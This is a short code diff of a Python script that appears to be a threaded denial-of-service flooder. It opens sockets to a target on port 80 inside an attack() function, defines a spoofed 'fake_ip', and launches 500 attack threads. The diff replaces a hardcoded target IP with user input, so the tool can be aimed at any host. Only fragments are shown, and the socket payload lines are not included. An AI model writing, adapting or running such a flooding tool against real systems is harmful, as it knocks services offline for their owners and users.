@@ -1,7 +1,7 @@
 import socket
 import threading
 
-target = '95.168.227.20'
+target = input()
 fake_ip = '182.21.20.32'
 port = 80
 
@@ -15,7 +15,7 @@ def attack():
         s.close()
 
 for i in range(500):
-    thread = threading.Thread(target=attack)
+    thread = threading.Thread(target = attack)
     thread.start()
 
 attack_num = 0
